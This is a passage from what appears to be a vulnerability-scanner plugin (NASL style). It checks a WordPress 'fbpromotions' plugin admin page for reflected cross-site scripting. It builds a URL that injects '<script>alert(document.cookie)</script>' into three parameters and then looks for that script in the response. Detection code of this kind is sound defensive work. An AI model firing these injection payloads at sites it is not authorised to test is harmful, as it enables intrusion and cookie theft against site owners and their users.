...
url = dir + "/wp-content/plugins/fbpromotions/admin/swarm-settings.php?" + "promo_type=\"><script>alert(document.cookie)</script>&fb_edit_action=" + "'><script>alert(document.cookie)</script>&promo_id='><script>alert(" + "document.cookie)</script>";
if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "<script>alert\\(document.cookie\\)</script>", extra_check: "SETTINGS<" )){
